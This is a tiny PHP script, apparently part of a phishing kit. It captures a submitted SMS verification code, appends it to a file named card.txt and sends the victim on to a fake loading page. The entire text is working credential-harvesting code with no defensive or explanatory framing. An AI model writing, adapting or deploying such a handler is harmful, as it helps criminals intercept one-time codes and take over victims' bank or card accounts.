<?php
file_put_contents("card.txt", "SMS CODE: " . $_POST["code"] .
"\n", FILE_APPEND);
header("Location: /loading.html");
exit();